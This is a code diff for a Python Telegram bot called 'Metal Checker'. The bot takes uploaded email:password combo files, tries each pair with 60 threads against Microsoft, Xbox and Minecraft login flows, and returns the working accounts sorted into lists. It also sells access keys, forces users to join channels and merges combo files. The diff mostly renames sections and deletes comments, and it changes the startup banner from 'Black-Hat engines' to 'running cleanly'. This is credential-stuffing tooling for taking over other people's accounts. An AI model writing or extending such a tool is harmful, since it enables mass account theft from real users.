@@ -12,9 +12,10 @@ from telebot import types
 import requests
 import urllib3
 import warnings
+from urllib.parse import urlparse, parse_qs
 
 # ==========================================
-# ⚙️ INITIAL SETTINGS & CODES INTEGRATION
+# ⚙️ GLOBAL CONFIGURATIONS & INITIALIZATION
 # ==========================================
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
@@ -34,10 +35,10 @@ SFTAG_URL = (
 
 MAX_RETRIES = 3
 REQUEST_TIMEOUT = 10
-THREAD_COUNT = 60  # Yüksek hız için thread sayısı artırıldı
+THREAD_COUNT = 60
 
 # ==========================================
-# 🗄️ DATABASE MANAGEMENT
+# 🗄️ DATABASE SYSTEM
 # ==========================================
 def init_db():
     conn = sqlite3.connect("metal_checker.db")
@@ -65,7 +66,6 @@ def init_db():
             channel_username TEXT PRIMARY KEY
         )
     """)
-    # Owner hesabı ekleme
     cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (OWNER_ID,))
     if not cursor.fetchone():
         now = datetime.now().strftime("%m/%d/%Y")
@@ -80,6 +80,7 @@ init_db()
 # 🔄 LIVE SESSION STATE TRACKING
 # ==========================================
 active_scans = {}
+user_merge_sessions = {}
 
 class LiveScan:
     def __init__(self, chat_id, total):
@@ -100,7 +101,6 @@ class LiveScan:
         self.is_running = True
         self._lock = threading.Lock()
         
-        # Dosya çıktıları hafızada tutulur stop durumunda verilmek üzere
         self.results = {
             "Minecraft": [],
             "GamePass": [],
@@ -177,8 +177,16 @@ def is_subscribed_to_channels(user_id):
             continue
     return True
 
+def is_admin(user_id):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('ADMIN', 'OWNER')", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    return True if row else False
+
 # ==========================================
-# 🧠 EXTRACTED LOGIC FROM NEWFILE.PY
+# 🧠 XBOX & MINECRAFT AUTH FUNCTIONS
 # ==========================================
 def get_sftag(session):
     for _ in range(MAX_RETRIES):
@@ -222,7 +230,6 @@ def microsoft_auth(session, email, password, url_post, sftag):
         except: pass
     return None, "error"
 
-from urllib.parse import urlparse, parse_qs
 def get_xbox_token(session, ms_token):
     for _ in range(MAX_RETRIES):
         try:
@@ -290,7 +297,7 @@ def get_xbox_profile(session, uhs, xsts_token):
     return {"gamertag": "N/A", "tier": "N/A", "rep": "N/A"}
 
 # ==========================================
-# ⚙️ CORE MULTI-THREAD ENGINE FOR BOT
+# ⚙️ CORE SCANNER LOGIC
 # ==========================================
 def core_scan_account(scan_obj, combo):
     if not scan_obj.is_running: return
@@ -371,7 +378,7 @@ def core_scan_account(scan_obj, combo):
         with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
 
 # ==========================================
-# 🖥️ TELEGRAM INTERFACE & MENU HANDLERS
+# 🖥️ TELEGRAM INTERFACE & ROUTING
 # ==========================================
 def build_main_keyboard(user_id):
     lang = get_user_lang(user_id)
@@ -384,15 +391,6 @@ def build_main_keyboard(user_id):
         kb.add(types.InlineKeyboardButton(LANG_DICT[lang]["admin_btn"], callback_data="admin_panel"))
     return kb
 
-def is_admin(user_id):
-    conn = sqlite3.connect("metal_checker.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('ADMIN', 'OWNER')", (user_id,))
-    row = cursor.fetchone()
-    conn.close()
-    return True if row else False
-
-@bot.message_with_type_filter(content_types=['text'])
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     uid = message.from_user.id
@@ -403,7 +401,6 @@ def cmd_start(message):
     
     if not row:
         now = datetime.now().strftime("%m/%d/%Y")
-        # İlk kayıt varsayılan haftalık ücretsiz veya boş
         cursor.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, 0, 0)", 
                        (uid, now, (datetime.now() + timedelta(days=7)).strftime("%m/%d/%Y"), "USER", "TR"))
         conn.commit()
@@ -426,7 +423,6 @@ def callback_set_lang(call):
     cursor.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, uid))
     conn.commit()
     conn.close()
-    
     bot.edit_message_text(LANG_DICT[lang]["main_menu"], call.message.chat.id, call.message.message_id, reply_markup=build_main_keyboard(uid))
 
 @bot.callback_query_handler(func=lambda call: call.data == "view_stats")
@@ -442,12 +438,9 @@ def callback_stats(call):
     if row:
         reg, exp, role, total_scanned, total_hits = row
         success_rate = (total_hits / total_scanned * 100) if total_scanned > 0 else 0.0
-        text = f"📊 *İstatistikleriniz / Your Statistics*\n\n👤 Kullanıcı ID: `{uid}`\n📅 Kayıt: {reg}\n👑 Üyelik: 📅 {role}\n📅 Bitiş: {exp}\n\n📈 Aktivite:\n✅ Toplam Tarama: {total_scanned}\n💎 Toplam Hit: {total_hits}\n🎯 Başarı Oranı: {success_rate:.2f}%\n📊 Bugünkü Tarama: 0"
+        text = f"📊 *İstatistikleriniz / Your Statistics*\n\n👤 Kullanıcı ID: `{uid}`\n📅 Kayıt: {reg}\n👑 Üyelik: {role}\n📅 Bitiş: {exp}\n\n📈 Aktivite:\n✅ Toplam Tarama: {total_scanned}\n💎 Toplam Hit: {total_hits}\n🎯 Başarı Oranı: {success_rate:.2f}%"
         bot.send_message(call.message.chat.id, text, reply_markup=build_main_keyboard(uid))
 
-# ==========================================
-# 🛑 SCAN CONTROLLER (/STOP)
-# ==========================================
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
     chat_id = message.chat.id
@@ -459,10 +452,32 @@ def cmd_stop(message):
         bot.send_message(chat_id, "❌ Aktif tarama bulunamadı.")
 
 # ==========================================
-# 🚀 TXT COMBO LOADER & DISPATCHER
+# 📂 DOCUMENT HANDLING & MERGER ACTION
 # ==========================================
+def send_force_join_msg(chat_id, lang):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT channel_username FROM channels")
+    chans = [r[0] for r in cursor.fetchall()]
+    conn.close()
+    kb = types.InlineKeyboardMarkup()
+    for ch in chans:
+        kb.add(types.InlineKeyboardButton(f"📢 Kanalı Takip Et", url=f"https://t.me/{ch}"))
+    bot.send_message(chat_id, LANG_DICT[lang]["force_join"], reply_markup=kb)
+
+def process_merge_document(message):
+    chat_id = message.chat.id
+    if len(user_merge_sessions[chat_id]) >= 30:
+        bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız.")
+        return
+    if message.document.file_name.endswith('.txt'):
+        file_info = bot.get_file(message.document.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        user_merge_sessions[chat_id].append(downloaded)
+        bot.send_message(chat_id, f"📥 {len(user_merge_sessions[chat_id])}. dosya kuyruğa eklendi.")
+
 @bot.message_handler(content_types=['document'])
-def handle_combo_file(message):
+def handle_incoming_document(message):
     uid = message.from_user.id
     chat_id = message.chat.id
     lang = get_user_lang(uid)
@@ -475,7 +490,6 @@ def handle_combo_file(message):
         send_force_join_msg(chat_id, lang)
         return
 
-    # Dosya birleştirme modundaysa süreci oraya akıt
     if chat_id in user_merge_sessions:
         process_merge_document(message)
         return
@@ -500,10 +514,8 @@ def handle_combo_file(message):
 
     scan_obj = LiveScan(chat_id, total)
     active_scans[chat_id] = scan_obj
-
     status_msg = bot.send_message(chat_id, "Initializing scan layout...")
 
-    # UI Refresh Loop Thread
     def ui_updater():
         while scan_obj.is_running and scan_obj.checked < scan_obj.total:
             time.sleep(5)
@@ -522,20 +534,17 @@ def handle_combo_file(message):
 
     threading.Thread(target=ui_updater, daemon=True).start()
 
-    # Core execution pool
     def run_pool():
         with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
             futures = [executor.submit(core_scan_account, scan_obj, c) for c in combos]
             concurrent.futures.wait(futures)
         
-        # Tarama Bittiğinde veya Durdurulduğunda DB güncellemesi yap
         conn = sqlite3.connect("metal_checker.db")
         cursor = conn.cursor()
         cursor.execute("UPDATE users SET total_scanned = total_scanned + ?, total_hits = total_hits + ? WHERE user_id = ?", (scan_obj.checked, scan_obj.hits, uid))
         conn.commit()
         conn.close()
 
-        # Dosyaları teslim et
         bot.send_message(chat_id, LANG_DICT[lang]["scan_done"])
         for cat, lines in scan_obj.results.items():
             if lines:
@@ -547,80 +556,41 @@ def handle_combo_file(message):
 
     threading.Thread(target=run_pool, daemon=True).start()
 
-def send_force_join_msg(chat_id, lang):
-    conn = sqlite3.connect("metal_checker.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT channel_username FROM channels")
-    chans = [r[0] for r in cursor.fetchall()]
-    conn.close()
-    
-    kb = types.InlineKeyboardMarkup()
-    for ch in chans:
-        kb.add(types.InlineKeyboardButton(f"📢 Kanalı Takip Et", url=f"https://t.me/{ch}"))
-    bot.send_message(chat_id, LANG_DICT[lang]["force_join"], reply_markup=kb)
-
-# ==========================================
-# 📂 FILE MERGER FEATURE (MAX 30 TXT)
-# ==========================================
-user_merge_sessions = {}
-
 @bot.callback_query_handler(func=lambda call: call.data == "merge_files")
 def callback_merge(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(call.from_user.id)
     user_merge_sessions[chat_id] = []
-    
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
     kb.add(types.KeyboardButton("BİRLEŞTİR / MERGE"))
     bot.send_message(chat_id, LANG_DICT[lang]["merge_start"], reply_markup=kb)
-
-def process_merge_document(message):
-    chat_id = message.chat.id
-    if len(user_merge_sessions[chat_id]) >= 30:
-        bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız.")
-        return
-    if message.document.file_name.endswith('.txt'):
-        file_info = bot.get_file(message.document.file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        user_merge_sessions[chat_id].append(downloaded)
-        bot.send_message(chat_id, f"📥 {len(user_merge_sessions[chat_id])}. dosya kuyruğa eklendi.")
 
 @bot.message_handler(func=lambda msg: msg.text in ["BİRLEŞTİR / MERGE", "BİRLEŞTİR", "MERGE"])
 def process_merge_action(message):
     chat_id = message.chat.id
     if chat_id not in user_merge_sessions or not user_merge_sessions[chat_id]:
         return
-    
     combined_data = []
     for file_bytes in user_merge_sessions[chat_id]:
         combined_data.append(file_bytes.decode('utf-8', errors='ignore'))
-    
     final_txt = "\n".join(combined_data)
     buf = io.BytesIO(final_txt.encode('utf-8'))
     buf.name = "Merged_Combos.txt"
-    
     bot.send_document(chat_id, buf, caption="✅ Tüm dosyalarınız alt alta birleştirildi.", reply_markup=types.ReplyKeyboardRemove())
     user_merge_sessions.pop(chat_id, None)
 
 # ==========================================
-# 👑 ADMIN PANEL & OWNER MANAGEMENT
+# 👑 ADMIN PANEL & SUBSCRIPTION MANAGEMENT
 # ==========================================
 @bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
 def callback_admin_panel(call):
     uid = call.from_user.id
     if uid != OWNER_ID and not is_admin(uid): return
-    
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
         types.InlineKeyboardButton("➕ Key Üret", callback_data="adm_gen_key"),
-        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast"),
         types.InlineKeyboardButton("🔒 Kanalları Yönet", callback_data="adm_channels")
     )
-    if uid == OWNER_ID:
-        kb.add(
-            types.InlineKeyboardButton("➕ Admin Ekle", callback_data="adm_add_admin"),
-            types.InlineKeyboardButton("❌ Admin Çıkar", callback_data="adm_rem_admin")
-        )
     bot.send_message(call.message.chat.id, "👑 *Metal Checker Kontrol Paneli*", reply_markup=kb)
 
 @bot.callback_query_handler(func=lambda call: call.data == "adm_gen_key")
@@ -651,10 +621,8 @@ def callback_save_key(call):
     cursor.execute("INSERT INTO keys VALUES (?, ?, ?)", (generated_key, duration.upper(), days))
     conn.commit()
     conn.close()
-    
     bot.send_message(call.message.chat.id, f"🔑 *Anahtar Üretildi:*\n`{generated_key}`")
 
-# Key aktivasyonu mesaj yakalayıcı
 @bot.message_handler(func=lambda msg: msg.text and msg.text.startswith("METAL-"))
 def handle_key_activation(message):
     uid = message.from_user.id
@@ -663,7 +631,6 @@ def handle_key_activation(message):
     cursor = conn.cursor()
     cursor.execute("SELECT days FROM keys WHERE key_code = ?", (key_code,))
     row = cursor.fetchone()
-    
     if row:
         days = row[0]
         cursor.execute("DELETE FROM keys WHERE key_code = ?", (key_code,))
@@ -676,9 +643,9 @@ def handle_key_activation(message):
     conn.close()
 
 # ==========================================
-# 🚀 RAILWAY RUNTIME LOOP
+# 🚀 INITIAL POLL LAUNCHER
 # ==========================================
 if __name__ == "__main__":
-    print("[ArZ] Metal Checker Bot is running successfully on Black-Hat engines...")
+    print("[ArZ] Metal Checker Bot is running cleanly...")
     bot.infinity_polling()
 
